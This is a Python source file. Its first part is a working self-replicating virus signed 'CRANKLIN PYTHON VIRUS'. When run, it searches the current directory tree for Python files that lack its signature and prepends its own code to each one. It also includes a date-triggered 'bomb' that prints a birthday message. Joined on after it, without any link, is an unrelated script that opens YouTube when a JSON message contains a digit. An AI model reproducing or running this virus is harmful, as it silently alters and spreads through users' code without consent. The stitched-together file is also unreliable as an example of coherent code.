import os
import datetime
SIGNATURE = "CRANKLIN PYTHON VIRUS"
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
def bomb():
    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
        print ("HAPPY BIRTHDAY CRANKLIN!)")
filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
bomb()
    
import json
import webbrowser

# Load the JSON data
with open('channel_messages.json', 'r') as file:
    data = json.load(file)

# Iterate over each message
for message in data:
    # Get the message text
    message_text = message.get('message', '')
    
    # Check if the message contains a number
    if any(char.isdigit() for char in message_text):
        # Open YouTube if a number is found
        webbrowser.open("https://www.youtube.com/")
        break  # Stop iterating if YouTube is opened
